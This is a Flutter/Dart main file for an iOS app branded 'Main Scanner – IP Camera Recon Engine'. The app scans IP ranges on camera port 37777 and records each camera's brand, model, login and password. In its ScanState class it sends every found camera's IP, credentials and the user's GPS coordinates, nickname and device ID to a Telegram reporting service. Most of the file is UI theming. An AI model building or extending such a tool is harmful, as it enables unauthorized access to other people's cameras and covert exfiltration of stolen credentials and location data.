// [context: Flutter/Dart 3.13.5, iOS-only, Wine Dark Material3 — premium v3]
// *lifted scan state lives here so tab switches never reset ports or results*

import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'services/auth_service.dart';
import 'services/scanner_service.dart';
import 'services/telegram_service.dart';
import 'services/result_storage.dart';
import 'screens/auth_screen.dart';
import 'screens/scan_screen.dart';
import 'screens/results_screen.dart';
import 'models/scan_result.dart';
import 'theme/palette.dart';

// ─────────────────────────────────────────────────────────────────────────────
// Wine Dark palette — deep red obsidian
// ─────────────────────────────────────────────────────────────────────────────
final _darkScheme = ColorScheme(
  brightness:              Brightness.dark,
  primary:                 kPrimary,    onPrimary: kOnPrimary,
  secondary:               kSecondary,  onSecondary: kOnSec,
  error:                   kError,      onError: Colors.black,
  surface:                 kSurfDark,   onSurface: kOnSurf,
  outline:                 kOutline,
  surfaceContainerLow:     const Color(0xFF100508),
  surfaceContainer:        kSurfCon,
  surfaceContainerHigh:    kSurfHigh,
  surfaceContainerHighest: kSurfXHigh,
);

final _theme = ThemeData(
  colorScheme:            _darkScheme,
  useMaterial3:           true,
  scaffoldBackgroundColor: kSurfDark,
  appBarTheme: const AppBarTheme(
    backgroundColor: kSurfDark,
    foregroundColor: kOnSurf,
    elevation:       0,
    centerTitle:     false,
    systemOverlayStyle: SystemUiOverlayStyle(
      statusBarColor:           Colors.transparent,
      statusBarIconBrightness:  Brightness.light,
    ),
  ),
  filledButtonTheme: FilledButtonThemeData(
    style: FilledButton.styleFrom(
      backgroundColor: kPrimary,
      foregroundColor: kOnPrimary,
      shape:           RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
      minimumSize:     const Size(64, 52),
      textStyle:       const TextStyle(fontWeight: FontWeight.w800, letterSpacing: 1.1, fontSize: 14),
    ),
  ),
  outlinedButtonTheme: OutlinedButtonThemeData(
    style: OutlinedButton.styleFrom(
      foregroundColor: kPrimary,
      side:            const BorderSide(color: kPrimary),
      shape:           RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
    ),
  ),
  inputDecorationTheme: InputDecorationTheme(
    labelStyle:    const TextStyle(color: kOutlineBr, fontSize: 13),
    hintStyle:     TextStyle(color: kOutline.withOpacity(0.7)),
    prefixIconColor: kPrimary,
    enabledBorder: OutlineInputBorder(
      borderSide: const BorderSide(color: kOutline),
      borderRadius: BorderRadius.circular(14),
    ),
    focusedBorder: OutlineInputBorder(
      borderSide: const BorderSide(color: kPrimary, width: 1.5),
      borderRadius: BorderRadius.circular(14),
    ),
    fillColor:       kSurfHigh,
    filled:          true,
    contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
  ),
  cardTheme: CardThemeData(
    color:     kSurfCon,
    elevation: 0,
    margin:    EdgeInsets.zero,
    shape:     RoundedRectangleBorder(
      borderRadius: BorderRadius.circular(16),
      side:         const BorderSide(color: kOutline, width: 0.5),
    ),
  ),
  chipTheme: ChipThemeData(
    backgroundColor:  kSurfHigh,
    selectedColor:    kPrimary,
    disabledColor:    kSurfCon,
    labelStyle:       const TextStyle(fontSize: 11, fontWeight: FontWeight.w500),
    side:             const BorderSide(color: kOutline, width: 0.5),
    shape:            RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
    padding:          const EdgeInsets.symmetric(horizontal: 6, vertical: 0),
    showCheckmark:    false,
  ),
  switchTheme: SwitchThemeData(
    thumbColor: WidgetStateProperty.resolveWith(
        (s) => s.contains(WidgetState.selected) ? kPrimary : kOutlineBr),
    trackColor: WidgetStateProperty.resolveWith(
        (s) => s.contains(WidgetState.selected) ? kPrimary.withOpacity(0.28) : kSurfHigh),
  ),
  progressIndicatorTheme: const ProgressIndicatorThemeData(color: kPrimary),
  dividerColor: kOutline.withOpacity(0.4),
  snackBarTheme: SnackBarThemeData(
    backgroundColor:   kSurfXHigh,
    contentTextStyle:  const TextStyle(color: kOnSurf),
    behavior:          SnackBarBehavior.floating,
    shape:             RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
  ),
);

// ─────────────────────────────────────────────────────────────────────────────
// Lifted scan state — survives tab switches
// ─────────────────────────────────────────────────────────────────────────────
class ScanState extends ChangeNotifier {
  final _scanner = ScannerService();
  final _tg      = TelegramService();

  bool             scanning     = false;
  ScanProgress     progress     = const ScanProgress(total: 0);
  List<ScanResult> results      = [];
  Set<int>         selectedPorts = {37777};
  bool             multiPort    = false;
  String           ipRange      = '192.168.1.1-254';

  String? _city, _country;

  Future<void> fetchGeo() async {
    try {
      final perm = await Geolocator.checkPermission();
      if (perm == LocationPermission.denied ||
          perm == LocationPermission.deniedForever) {
        await Geolocator.requestPermission();
      }
    } catch (_) {}
  }

  Future<({String? city, String? country})> _geo() async {
    if (_city != null) return (city: _city, country: _country);
    try {
      final pos = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.low,
        timeLimit:       const Duration(seconds: 5),
      );
      _city    = '${pos.latitude.toStringAsFixed(2)},${pos.longitude.toStringAsFixed(2)}';
      _country = 'GPS';
    } catch (_) {}
    return (city: _city, country: _country);
  }

  Future<void> startScan() async {
    final raw = ipRange.trim();
    if (raw.isEmpty) return;
    final ips = expandIpRange(raw);
    if (ips.isEmpty) return;

    scanning = true;
    results  = [];
    progress = ScanProgress(total: ips.length);
    notifyListeners();
    _tg.resetScanReport();

    final geo   = await _geo();
    final nick  = await AuthService.getNickname();
    final devId = await AuthService.getDeviceId();

    _tg.reportScanStarted(
      nickname:    nick,
      totalIps:    ips.length,
      activePorts: selectedPorts.toList(),
      ipRange:     raw,
      city:        geo.city,
      country:     geo.country,
      deviceId:    devId,
    );

    final started = DateTime.now();

    await _scanner.scanIps(
      ips:   ips,
      ports: multiPort && selectedPorts.length > 1
          ? selectedPorts.toList()
          : [selectedPorts.first],
      onResult: (r) {
        ResultStorage.addResult(r);
        _tg.reportCameraFound(
          nickname: nick, ip: r.ip, port: r.port,
          brand:    r.brand, login: r.login, password: r.password,
          model:    r.model, city: geo.city, country: geo.country,
        );
        results = [r, ...results];
        notifyListeners();
      },
      onProgress: (p) {
        progress = p;
        notifyListeners();
      },
    );

    final elapsed = DateTime.now().difference(started);
    if (progress.cancelled) {
      _tg.reportScanStopped(nickname: nick, checked: progress.checked);
    } else {
      _tg.reportSessionFinished(
        nickname:    nick,
        total:       progress.checked,
        successful:  results.length,
        openPorts:   progress.openPorts,
        elapsed:     elapsed,
      );
    }

    scanning = false;
    notifyListeners();
  }

  void stopScan() => _scanner.cancel();

  // BUG FIX: was not calling notifyListeners in some paths
  void togglePort(int port, bool on) {
    final next = Set<int>.from(selectedPorts);
    if (on) {
      next.add(port);
    } else if (next.length > 1) {
      next.remove(port);
    }
    if (next != selectedPorts) {
      selectedPorts = next;
      notifyListeners();
    }
  }

  void resetPorts() {
    selectedPorts = {37777};
    notifyListeners();
  }

  void setMultiPort(bool v) {
    multiPort = v;
    notifyListeners();
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────────────────────
void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor:          Colors.transparent,
    statusBarIconBrightness: Brightness.light,
  ));
  runApp(const MainScannerApp());
}

class MainScannerApp extends StatelessWidget {
  const MainScannerApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
        title:                    'Main Scanner',
        debugShowCheckedModeBanner: false,
        theme:                    _theme,
        home:                     const _AppRoot(),
      );
}

// ─────────────────────────────────────────────────────────────────────────────
// Auth gate
// ─────────────────────────────────────────────────────────────────────────────
class _AppRoot extends StatefulWidget {
  const _AppRoot();
  @override
  State<_AppRoot> createState() => _AppRootState();
}

class _AppRootState extends State<_AppRoot> {
  bool?     _activated;
  final     _scanState = ScanState();

  @override
  void initState() {
    super.initState();
    _check();
  }

  @override
  void dispose() {
    _scanState.dispose();
    super.dispose();
  }

  Future<void> _check() async {
    final act  = await AuthService.isActivated();
    final lock = await AuthService.verifyDeviceLock();
    if (mounted) setState(() => _activated = act && lock);
    if (act && lock) _scanState.fetchGeo();
  }

  @override
  Widget build(BuildContext context) {
    if (_activated == null) {
      return const Scaffold(
        backgroundColor: kSurfDark,
        body: Center(child: CircularProgressIndicator()),
      );
    }
    if (!_activated!) {
      return AuthScreen(onActivated: () {
        setState(() => _activated = true);
        _scanState.fetchGeo();
      });
    }
    return _MainShell(scanState: _scanState);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Main shell with premium segmented tab bar
// ─────────────────────────────────────────────────────────────────────────────
class _MainShell extends StatefulWidget {
  final ScanState scanState;
  const _MainShell({required this.scanState});
  @override
  State<_MainShell> createState() => _MainShellState();
}

class _MainShellState extends State<_MainShell>
    with SingleTickerProviderStateMixin {
  late final TabController _tc = TabController(length: 2, vsync: this);

  @override
  void initState() {
    super.initState();
    _tc.addListener(() { if (!_tc.indexIsChanging) setState(() {}); });
  }

  @override
  void dispose() { _tc.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final cs  = Theme.of(context).colorScheme;
    final idx = _tc.index;

    return Scaffold(
      backgroundColor: cs.surface,
      // ── custom header ──────────────────────────────────────────────────────
      appBar: PreferredSize(
        preferredSize: const Size.fromHeight(104),
        child: Container(
          decoration: BoxDecoration(
            color: kSurfCon,
            border: Border(bottom: BorderSide(color: kOutline.withOpacity(0.3))),
          ),
          child: SafeArea(
            bottom: false,
            child: Padding(
              padding: const EdgeInsets.fromLTRB(18, 8, 18, 0),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // Brand row
                  Row(
                    children: [
                      _LogoBadge(),
                      const SizedBox(width: 10),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text('MAIN SCANNER',
                              style: TextStyle(
                                color: kOnSurf,
                                fontSize: 15,
                                fontWeight: FontWeight.w900,
                                letterSpacing: 2.0,
                              )),
                          Text('IP Camera Recon Engine',
                              style: TextStyle(
                                color: kOutlineBr,
                                fontSize: 10,
                                letterSpacing: 0.5,
                              )),
                        ],
                      ),
                    ],
                  ),
                  const SizedBox(height: 10),
                  // Segmented tab bar
                  _SegmentedTabBar(controller: _tc, activeIdx: idx),
                ],
              ),
            ),
          ),
        ),
      ),
      body: TabBarView(
        controller: _tc,
        // NeverScrollable: prevents swipe destroying scan state
        physics: const NeverScrollableScrollPhysics(),
        children: [
          ScanScreen(scanState: widget.scanState),
          const ResultsScreen(),
        ],
      ),
    );
  }
}

// ── Logo badge ────────────────────────────────────────────────────────────────
class _LogoBadge extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Container(
      width: 36, height: 36,
      decoration: BoxDecoration(
        gradient: const LinearGradient(
          colors: [Color(0xFF9B2335), Color(0xFF5C0F1A)],
          begin: Alignment.topLeft,
          end:   Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(10),
        boxShadow: [
          BoxShadow(color: kPrimary.withOpacity(0.35), blurRadius: 8, offset: const Offset(0, 3)),
        ],
      ),
      child: const Icon(Icons.radar, color: Colors.white, size: 20),
    );
  }
}

// ── Segmented tab bar ─────────────────────────────────────────────────────────
class _SegmentedTabBar extends StatelessWidget {
  final TabController controller;
  final int           activeIdx;
  const _SegmentedTabBar({required this.controller, required this.activeIdx});

  @override
  Widget build(BuildContext context) {
    return Container(
      height:      42,
      decoration:  BoxDecoration(
        color:        kSurfXHigh,
        borderRadius: BorderRadius.circular(12),
        border:       Border.all(color: kOutline.withOpacity(0.5)),
      ),
      child: Padding(
        padding: const EdgeInsets.all(3),
        child: Row(
          children: [
            _Tab(label: 'Scanner', icon: Icons.wifi_find_rounded,
                active: activeIdx == 0, onTap: () => controller.animateTo(0)),
            _Tab(label: 'Saved',   icon: Icons.bookmark_rounded,
                active: activeIdx == 1, onTap: () => controller.animateTo(1)),
          ],
        ),
      ),
    );
  }
}

class _Tab extends StatelessWidget {
  final String   label;
  final IconData icon;
  final bool     active;
  final VoidCallback onTap;
  const _Tab({required this.label, required this.icon,
              required this.active, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return Expanded(
      child: GestureDetector(
        onTap: onTap,
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 180),
          decoration: BoxDecoration(
            color:        active ? kPrimary : Colors.transparent,
            borderRadius: BorderRadius.circular(9),
            boxShadow: active ? [
              BoxShadow(color: kPrimary.withOpacity(0.4), blurRadius: 6, offset: const Offset(0, 2)),
            ] : null,
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, size: 16,
                  color: active ? kOnPrimary : kOutlineBr),
              const SizedBox(width: 5),
              Text(label,
                  style: TextStyle(
                    color:      active ? kOnPrimary : kOutlineBr,
                    fontSize:   12,
                    fontWeight: active ? FontWeight.w700 : FontWeight.w500,
                    letterSpacing: 0.3,
                  )),
            ],
          ),
        ),
      ),
    );
  }
}
